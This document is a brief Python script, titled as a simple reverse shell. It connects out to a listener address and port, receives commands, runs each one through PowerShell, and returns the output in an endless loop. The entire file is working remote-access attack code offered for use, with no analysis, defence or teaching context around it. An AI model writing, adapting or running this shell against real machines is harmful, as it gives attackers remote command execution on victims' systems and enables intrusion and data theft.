
 ## ⚡ A  very Simple Reverse Shell ⚡ ##

import subprocess,socket

def connection(RHOST:str,RPORT:int):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    return s

def recive(conn) -> str:
    cmd = conn.recv(1024).decode()
    return cmd

def execute(cmd) -> str:
    try:
        result = subprocess.check_output(['powershell','-c',cmd],shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        result = e.output
    return result.decode()

def send(conn,data:str):
    conn.send(data.encode())

def main():
    IP = '127.0.0.1'                       ##   Listener IP  ## 
    PORT = 6565                      ##  Port listened on by the listener  ##
    conn = connection(IP,PORT)
    
    while True:
        cmd = recive(conn)
        output = execute(cmd)
        send(conn,output)
        
if __name__ == '__main__':
    main()